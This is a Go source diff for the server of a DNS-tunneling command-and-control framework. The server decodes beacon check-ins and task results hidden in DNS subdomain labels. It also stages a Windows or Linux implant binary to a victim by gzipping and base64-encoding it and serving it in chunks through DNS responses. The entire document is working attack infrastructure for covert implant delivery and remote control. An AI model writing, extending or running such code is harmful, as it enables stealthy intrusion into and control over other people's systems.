@@ -9,6 +9,7 @@ import (
 	"encoding/base64"
 	"fmt"
 	"os"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"sync"
@@ -30,6 +31,13 @@ const (
 
 	// Result preview settings
 	resultPreviewMaxLength = 200
+
+	// DNS label chunk size (RFC compliant)
+	dnsLabelMaxLength = 62
+
+	// Session expiration times
+	stagerSessionTimeout  = 30 * time.Minute // Stager sessions expire after 30 minutes
+	expectedResultTimeout = 1 * time.Hour    // Expected results expire after 1 hour
 )
 
 // Beacon represents a connected beacon client
@@ -75,13 +83,12 @@ type ExpectedResult struct {
 	ReceivedData []string // Store chunks in order
 }
 
-// StagerSession tracks an active stager download session
+// StagerSession tracks a stager deployment session
 type StagerSession struct {
-	IP          string
+	ClientIP    string
 	OS          string
 	Arch        string
-	ClientPath  string // Path to the client binary to send
-	Chunks      []string
+	Chunks      []string // Base64-encoded chunks
 	TotalChunks int
 	CreatedAt   time.Time
 }
@@ -92,7 +99,7 @@ type C2Manager struct {
 	tasks           map[string]*Task
 	resultChunks    map[string][]ResultChunk   // key: taskID (legacy)
 	expectedResults map[string]*ExpectedResult // key: taskID (new two-phase)
-	stagerSessions  map[string]*StagerSession  // key: clientIP (stager support)
+	stagerSessions  map[string]*StagerSession  // key: clientIP
 	mutex           sync.RWMutex
 	taskCounter     int
 	debug           bool
@@ -104,7 +111,7 @@ type C2Manager struct {
 func NewC2Manager(debug bool, encryptionKey string) *C2Manager {
 	aesKey := generateAESKey(encryptionKey)
 
-	return &C2Manager{
+	c2 := &C2Manager{
 		beacons:         make(map[string]*Beacon),
 		tasks:           make(map[string]*Task),
 		resultChunks:    make(map[string][]ResultChunk),
@@ -113,6 +120,44 @@ func NewC2Manager(debug bool, encryptionKey string) *C2Manager {
 		taskCounter:     taskCounterStart,
 		debug:           debug,
 		aesKey:          aesKey,
+	}
+
+	// Start cleanup goroutine
+	go c2.cleanupExpiredSessions()
+
+	return c2
+}
+
+// cleanupExpiredSessions periodically removes expired stager sessions and expected results
+func (c2 *C2Manager) cleanupExpiredSessions() {
+	ticker := time.NewTicker(5 * time.Minute)
+	defer ticker.Stop()
+
+	for range ticker.C {
+		c2.mutex.Lock()
+		now := time.Now()
+
+		// Clean up expired stager sessions
+		for ip, session := range c2.stagerSessions {
+			if now.Sub(session.CreatedAt) > stagerSessionTimeout {
+				delete(c2.stagerSessions, ip)
+				if c2.debug {
+					logf("[C2] Cleaned up expired stager session for %s", ip)
+				}
+			}
+		}
+
+		// Clean up expired expected results
+		for taskID, expected := range c2.expectedResults {
+			if now.Sub(expected.ReceivedAt) > expectedResultTimeout {
+				delete(c2.expectedResults, taskID)
+				if c2.debug {
+					logf("[C2] Cleaned up expired expected result for task %s", taskID)
+				}
+			}
+		}
+
+		c2.mutex.Unlock()
 	}
 }
 
@@ -236,91 +281,94 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		return "", false
 	}
 
-	// For C2 traffic, subdomain format is: <encoded_data>.<timestamp>.secwolf.net
-	// We need to extract just the encoded data part (first label)
-	parts := strings.Split(subdomain, ".")
-	if len(parts) == 0 {
+	// Skip legitimate DNS names (NS, MX, WWW, etc.) - check before processing
+	firstLabel := subdomain
+	if dotPos := strings.Index(subdomain, "."); dotPos != -1 {
+		firstLabel = subdomain[:dotPos]
+	}
+	if isLegitimateSubdomain(firstLabel) {
 		return "", false
 	}
 
-	// The encoded message is in the first part, timestamp is in the second
-	encodedMessage := parts[0]
+	// Both client and stager add timestamps for DNS cache busting
+	// Format: base36_data_labels.timestamp.domain OR base36_label1.base36_label2.timestamp.domain
+	// The timestamp is numeric (unix timestamp, 10 digits) and should be removed before decoding
 
-	logf("[DEBUG] Processing subdomain: %s, extracted message: %s", subdomain, encodedMessage)
+	// Split subdomain into labels
+	labels := strings.Split(subdomain, ".")
 
-	// Skip legitimate DNS names (NS, MX, WWW, etc.)
-	if isLegitimateSubdomain(encodedMessage) {
-		return "", false
-	}
-
-	// Must look like base36 encoding (for beacons)
-	// We allow shorter messages for stagers since they use simple base36 without encryption
-	isLikelyBase36 := looksLikeBase36(encodedMessage)
-	isShortMessage := len(encodedMessage) < 100
-
-	logf("[DEBUG] isLikelyBase36=%v, isShortMessage=%v, len=%d", isLikelyBase36, isShortMessage, len(encodedMessage))
-
-	// Try to decode as stager message first (base36 only, no encryption)
-	// Stager messages are shorter and don't use encryption
-	if isShortMessage || isLikelyBase36 {
-		plaintext, err := base36DecodeString(encodedMessage)
-		if err == nil {
-			logf("[DEBUG] Base36 decoded: %s (checking for stager)", plaintext)
-			if strings.HasPrefix(plaintext, "STG|") || strings.HasPrefix(plaintext, "ACK|") {
-				// This is a stager message - handle it separately
-				messageParts := strings.Split(plaintext, "|")
-
-				// Remove timestamp if present
-				if len(messageParts) > 1 {
-					lastPart := messageParts[len(messageParts)-1]
-					if len(lastPart) >= unixTimestampMinLength && len(lastPart) <= unixTimestampMaxLength {
-						if _, tsErr := strconv.ParseInt(lastPart, 10, 64); tsErr == nil {
-							plaintext = strings.Join(messageParts[:len(messageParts)-1], "|")
-							messageParts = strings.Split(plaintext, "|")
-						}
-					}
+	// Check if last label is a timestamp (10-digit numeric string)
+	var encodedLabels []string
+	if len(labels) > 1 {
+		lastLabel := labels[len(labels)-1]
+		// Check if it's a unix timestamp (10-11 digits, all numeric)
+		if len(lastLabel) >= 10 && len(lastLabel) <= 11 {
+			isNumeric := true
+			for _, c := range lastLabel {
+				if c < '0' || c > '9' {
+					isNumeric = false
+					break
 				}
-
-				messageType := messageParts[0]
-				switch messageType {
-				case "STG":
-					if len(messageParts) >= 4 {
-						response := c2.handleStagerRequest(messageParts, clientIP)
-						logf("[DEBUG] Stager response: %s", response)
-						return response, true
-					}
-				case "ACK":
-					// ACK format: ACK|<chunk_index>|<IP>|UNKN0WN
-					if len(messageParts) >= 4 && messageParts[3] == "UNKN0WN" {
-						response := c2.handleStagerAck(messageParts, clientIP)
-						logf("[DEBUG] Stager response: %s", response)
-						return response, true
-					}
-				}
+			}
+			if isNumeric {
+				// Last label is a timestamp, remove it
+				encodedLabels = labels[:len(labels)-1]
+			} else {
+				// Not a timestamp, keep all labels
+				encodedLabels = labels
 			}
 		} else {
-			if c2.debug {
-				logf("[DEBUG] Base36 decode failed: %v", err)
-			}
+			// Last label isn't timestamp length, keep all labels
+			encodedLabels = labels
 		}
+	} else {
+		encodedLabels = labels
 	}
 
-	// Decode the subdomain as encrypted beacon data
+	// Join all non-timestamp labels to reconstruct the base36 encoded message
+	encodedMessage := strings.Join(encodedLabels, "")
+
+	if c2.debug {
+		logf("[DEBUG] Processing subdomain: %s, extracted message: %s (removed timestamp: %v)",
+			subdomain, encodedMessage, len(encodedLabels) != len(labels))
+		logf("[DEBUG] isLikelyBase36=%v, len=%d",
+			looksLikeBase36(encodedMessage), len(encodedMessage))
+	}
+
+	// Try decrypting as encrypted beacon data first (normal client traffic)
 	decoded, err := c2.decodeBeaconData(encodedMessage)
+
+	// If decryption fails, try base36 decode without encryption (stager traffic)
 	if err != nil {
-		return "", false
+		if c2.debug {
+			logf("[DEBUG] AES-GCM decryption failed, trying plain base36 decode for stager")
+		}
+		decoded, err = base36DecodeString(encodedMessage)
+		if err != nil {
+			if c2.debug {
+				logf("[DEBUG] Base36 decode also failed: %v", err)
+			}
+			return "", false
+		}
+		if c2.debug {
+			logf("[DEBUG] Plain base36 decoded (stager): %s", decoded)
+		}
+	} else {
+		if c2.debug {
+			logf("[DEBUG] AES-GCM decrypted (client): %s", decoded)
+		}
 	}
 
 	// Strip timestamp from decoded data (cache busting)
 	// Format: COMMAND|data|...|timestamp -> COMMAND|data|...
-	decodedParts := strings.Split(decoded, "|")
-	if len(decodedParts) > 1 {
+	timestampParts := strings.Split(decoded, "|")
+	if len(timestampParts) > 1 {
 		// Check if last part is a timestamp (numeric)
-		lastPart := decodedParts[len(decodedParts)-1]
+		lastPart := timestampParts[len(timestampParts)-1]
 		if len(lastPart) >= unixTimestampMinLength && len(lastPart) <= unixTimestampMaxLength { // Unix timestamp length
 			if _, err := strconv.ParseInt(lastPart, 10, 64); err == nil {
 				// Remove timestamp
-				decoded = strings.Join(decodedParts[:len(decodedParts)-1], "|")
+				decoded = strings.Join(timestampParts[:len(timestampParts)-1], "|")
 			}
 		}
 	}
@@ -333,6 +381,20 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 
 	messageType := strings.SplitN(decoded, "|", 2)[0]
 	switch messageType {
+	case "STG": // Stager request
+		parts := strings.SplitN(decoded, "|", 4) // STG|IP|OS|ARCH
+		if len(parts) < 4 {
+			return "", false
+		}
+		return c2.handleStagerRequest(parts, clientIP), true
+
+	case "ACK": // Stager acknowledgment
+		parts := strings.SplitN(decoded, "|", 4) // ACK|chunk_index|IP|session
+		if len(parts) < 2 {
+			return "", false
+		}
+		return c2.handleStagerAck(parts, clientIP), true
+
 	case "CHECKIN", "CHK":
 		parts := strings.SplitN(decoded, "|", 5) // CHK|id|host|user|os
 		if len(parts) < 5 {
@@ -449,20 +511,18 @@ func (c2 *C2Manager) handleResult(parts []string) string {
 	if len(preview) > resultPreviewMaxLength {
 		preview = preview[:resultPreviewMaxLength] + "..."
 	}
-	logf("[C2] Received RESULT from %s for %s (%d bytes). Preview: %s", beaconID, taskID, len(result), preview)
+	logf("[C2] Result: %s → %s: %s", beaconID, taskID, preview)
 
-	// Update task with result
+	// Update the task
 	if task, exists := c2.tasks[taskID]; exists {
 		task.Result = result
 		task.Status = "completed"
-	} else {
-		logf("[C2] Warning: Result received for unknown task %s (beacon %s)", taskID, beaconID)
 	}
 
 	return "ACK"
 }
 
-// handleChunk processes a chunked result from a beacon
+// handleChunk processes a chunk of result data (DEPRECATED - legacy protocol)
 func (c2 *C2Manager) handleChunk(parts []string) string {
 	if len(parts) < 6 {
 		return "ERROR"
@@ -604,8 +664,8 @@ func (c2 *C2Manager) handleData(parts []string) string {
 	return "ACK"
 }
 
-// handleStagerRequest processes a stager initialization request
-// STG|IP|OS|ARCH -> META|<total_chunks>
+// handleStagerRequest processes a stager deployment request
+// Format: STG|IP|OS|ARCH
 func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string) string {
 	if len(parts) < 4 {
 		return "ERROR"
@@ -615,43 +675,100 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string) string
 	stagerOS := parts[2]
 	stagerArch := parts[3]
 
-	logf("[STAGER] Request from resolver %s for stager at %s (%s/%s)", clientIP, stagerIP, stagerOS, stagerArch)
+	logf("[C2] Stager request from %s (%s/%s) - IP: %s", clientIP, stagerOS, stagerArch, stagerIP)
 
-	// Determine which client binary to send
-	clientPath := c2.getClientPath(stagerOS, stagerArch)
+	// Determine client binary filename based on OS
+	var clientFilename string
+	if strings.ToLower(stagerOS) == "windows" {
+		clientFilename = "dns-client-windows.exe"
+	} else {
+		clientFilename = "dns-client-linux"
+	}
+
+	// Try multiple possible paths for the client binary
+	var clientPath string
+	possiblePaths := []string{
+		filepath.Join("build", clientFilename),       // If running from project root
+		filepath.Join("..", "build", clientFilename), // If running from Server/ directory
+		filepath.Join(".", clientFilename),           // Same directory
+		clientFilename,                               // Current directory
+	}
+
+	// Find the first existing path
+	for _, path := range possiblePaths {
+		if _, err := os.Stat(path); err == nil {
+			clientPath = path
+			break
+		}
+	}
+
+	// Check if we found a valid path
 	if clientPath == "" {
-		logf("[STAGER] ERROR: No suitable client found for %s/%s", stagerOS, stagerArch)
-		return "ERROR"
+		logf("[C2] Error: Client binary not found. Tried paths: %v", possiblePaths)
+		return "ERROR|BINARY_NOT_FOUND"
 	}
 
-	// Prepare the client binary for staging
-	chunks, err := c2.prepareClientForStaging(clientPath)
+	logf("[C2] Found client binary at: %s", clientPath)
+
+	// Read client binary
+	clientData, err := os.ReadFile(clientPath)
 	if err != nil {
-		logf("[STAGER] ERROR: Failed to prepare client: %v", err)
-		return "ERROR"
+		logf("[C2] Error reading client binary: %v", err)
+		return "ERROR|READ_FAILED"
 	}
 
-	// Create stager session - keyed by stager's IP, not DNS resolver's IP
+	logf("[C2] Loaded client binary: %s (%d bytes)", clientPath, len(clientData))
+
+	// Compress with gzip (use bytes.Buffer so we preserve raw binary data)
+	var compressedBuf bytes.Buffer
+	gzWriter := gzip.NewWriter(&compressedBuf)
+	_, err = gzWriter.Write(clientData)
+	if err != nil {
+		logf("[C2] Error compressing client: %v", err)
+		return "ERROR|COMPRESS_FAILED"
+	}
+	gzWriter.Close()
+
+	compressed := compressedBuf.Bytes()
+	logf("[C2] Compressed client: %d bytes -> %d bytes (%.1f%% reduction)",
+		len(clientData), len(compressed),
+		100.0*(1.0-float64(len(compressed))/float64(len(clientData))))
+
+	// Base64 encode
+	base64Data := base64.StdEncoding.EncodeToString(compressed)
+	logf("[C2] Base64 encoded: %d bytes", len(base64Data))
+
+	// Split into chunks (400 bytes per chunk as defined in stager)
+	const chunkSize = 400
+	var chunks []string
+	for i := 0; i < len(base64Data); i += chunkSize {
+		end := i + chunkSize
+		if end > len(base64Data) {
+			end = len(base64Data)
+		}
+		chunks = append(chunks, base64Data[i:end])
+	}
+
+	logf("[C2] Split into %d chunks of %d bytes each", len(chunks), chunkSize)
+
+	// Store session for this stager using the stager's actual IP (not DNS resolver IP)
+	// This allows the stager to send ACKs through different DNS resolvers
 	session := &StagerSession{
-		IP:          stagerIP,
+		ClientIP:    stagerIP, // Use stager's IP from the STG message
 		OS:          stagerOS,
 		Arch:        stagerArch,
-		ClientPath:  clientPath,
 		Chunks:      chunks,
 		TotalChunks: len(chunks),
 		CreatedAt:   time.Now(),
 	}
+	c2.stagerSessions[stagerIP] = session // Key by stager's actual IP
 
-	// Key session by stager's IP, not DNS resolver's IP
-	c2.stagerSessions[stagerIP] = session
-
-	logf("[STAGER] Prepared %d chunks from %s for %s", len(chunks), clientPath, stagerIP)
-
+	// Return metadata
 	return fmt.Sprintf("META|%d", len(chunks))
 }
 
-// handleStagerAck processes stager chunk acknowledgment
-// ACK|<chunk_index>|<stager_ip>|UNKN0WN -> CHUNK|<data>
+// handleStagerAck processes a stager acknowledgment for chunk delivery
+// Format: ACK|chunk_index|stager_IP|hostname
 func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string) string {
 	if len(parts) < 4 {
 		return "ERROR"
@@ -659,112 +776,35 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string) string {
 
 	chunkIndex, err := strconv.Atoi(parts[1])
 	if err != nil {
-		return "ERROR"
+		logf("[C2] Invalid chunk index from %s: %s", clientIP, parts[1])
+		return "ERROR|INVALID_INDEX"
 	}
 
-	// Extract stager IP from the ACK message (format: ACK|index|IP|UNKN0WN)
-	stagerIP := parts[2]
+	stagerIP := parts[2] // Extract stager's actual IP from ACK message
 
-	// Get stager session using the stager's IP, not the DNS resolver's IP
+	// Look up the stager session using stager's actual IP (not DNS resolver IP)
 	session, exists := c2.stagerSessions[stagerIP]
 	if !exists {
-		logf("[STAGER] ERROR: No session found for %s (resolver: %s)", stagerIP, clientIP)
-		return "ERROR"
+		logf("[C2] No stager session found for stager IP %s (DNS resolver: %s)", stagerIP, clientIP)
+		return "ERROR|NO_SESSION"
 	}
 
 	// Validate chunk index
 	if chunkIndex < 0 || chunkIndex >= session.TotalChunks {
-		logf("[STAGER] ERROR: Invalid chunk index %d (total: %d)", chunkIndex, session.TotalChunks)
-		return "ERROR"
+		logf("[C2] Invalid chunk index %d (total: %d) from %s",
+			chunkIndex, session.TotalChunks, clientIP)
+		return "ERROR|INDEX_OUT_OF_RANGE"
 	}
 
-	// Send the requested chunk
+	// Get the requested chunk
 	chunk := session.Chunks[chunkIndex]
 
-	if c2.debug {
-		logf("[STAGER] Sending chunk %d/%d to %s (%d bytes)",
-			chunkIndex+1, session.TotalChunks, stagerIP, len(chunk))
-	}
+	logf("[C2] Sending chunk %d/%d to %s (%d bytes)",
+		chunkIndex+1, session.TotalChunks, clientIP, len(chunk))
 
-	// Clean up session if this was the last chunk
-	if chunkIndex == session.TotalChunks-1 {
-		logf("[STAGER] Completed staging to %s (%s/%s)", stagerIP, session.OS, session.Arch)
-		delete(c2.stagerSessions, stagerIP)
-	}
-
+	// Return chunk (CHUNK responses are NOT base36 encoded - sent as plain text)
+	// The stager expects: CHUNK|<base64_data>
 	return fmt.Sprintf("CHUNK|%s", chunk)
-}
-
-// getClientPath determines which client binary to send based on OS and architecture
-func (c2 *C2Manager) getClientPath(os, arch string) string {
-	// Normalize OS and arch strings
-	os = strings.ToLower(os)
-	arch = strings.ToLower(arch)
-
-	// Map of OS/arch combinations to client binary paths
-	// These paths are relative to the server's working directory
-	clientMap := map[string]string{
-		"windows/x64":   "build/dns-client-windows.exe",
-		"windows/amd64": "build/dns-client-windows.exe",
-		"linux/x86_64":  "build/dns-client-linux",
-		"linux/amd64":   "build/dns-client-linux",
-		"linux/x64":     "build/dns-client-linux",
-	}
-
-	key := fmt.Sprintf("%s/%s", os, arch)
-	if path, ok := clientMap[key]; ok {
-		return path
-	}
-
-	// Fallback: try just OS-based match
-	for k, v := range clientMap {
-		if strings.HasPrefix(k, os+"/") {
-			return v
-		}
-	}
-
-	return ""
-}
-
-// prepareClientForStaging reads, compresses, base64 encodes, and chunks the client binary
-func (c2 *C2Manager) prepareClientForStaging(clientPath string) ([]string, error) {
-	// Read the client binary
-	clientData, err := os.ReadFile(clientPath)
-	if err != nil {
-		return nil, fmt.Errorf("failed to read client binary: %v", err)
-	}
-
-	// Compress the client data using gzip
-	var compressedBuf bytes.Buffer
-	gzipWriter := gzip.NewWriter(&compressedBuf)
-	if _, err := gzipWriter.Write(clientData); err != nil {
-		return nil, fmt.Errorf("failed to compress client: %v", err)
-	}
-	if err := gzipWriter.Close(); err != nil {
-		return nil, fmt.Errorf("failed to close gzip writer: %v", err)
-	}
-
-	compressed := compressedBuf.Bytes()
-
-	// Base64 encode the compressed data
-	encoded := base64.StdEncoding.EncodeToString(compressed)
-
-	// Split into chunks - must fit in DNS UDP packets (512 bytes max without EDNS0)
-	// CHUNK|<data> format, so data must be small enough to fit in DNS response
-	// Using 400 bytes per chunk - larger chunks = fewer requests
-	// This balances between DNS packet size limits and download speed
-	const chunkSize = 400
-	var chunks []string
-
-	for i := 0; i < len(encoded); i += chunkSize {
-		end := i + chunkSize
-		if end > len(encoded) {
-			end = len(encoded)
-		}
-		chunks = append(chunks, encoded[i:end])
-	}
-
-	return chunks, nil
 }
 
 // AddTask adds a new task for a specific beacon
